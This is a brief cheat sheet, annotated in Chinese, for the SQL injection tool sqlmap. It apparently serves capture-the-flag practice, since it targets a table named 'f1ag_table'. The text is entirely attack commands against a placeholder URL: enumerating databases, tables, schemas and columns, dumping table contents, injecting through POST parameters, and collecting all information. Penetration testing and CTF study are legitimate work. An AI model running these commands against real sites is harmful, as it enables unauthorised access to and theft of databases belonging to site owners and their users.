# sqlmap

```powershell
python sqlmap.py -u "https://xxx/?id=1&username=1" --dbs # 查询所有数据库
python sqlmap.py -u "https://xxx/?id=1&username=1" -D test --tables # 查询test数据库下所有表
python sqlmap.py -u "https://xxx/?id=1&username=1" -D test --schema # 查询test数据库下所有表结构
python sqlmap.py -u "https://xxx/?id=1&username=1" -D test -T f1ag_table --column # 查询test数据库中f1ag_table表的列
python sqlmap.py -u "https://xxx/?id=1&username=1" -D test -T f1ag_table --dump # 获取f1ag_table表的内容
python sqlmap.py -u "https://xxx/" --data "id=1" --dbs # 传输POST参数
python sqlmap.py -u "https://xxx/" --all # 获取所有信息
```

清除缓存：

```powershell
python sqlmap.py -u "https://xxx/" --purge
```



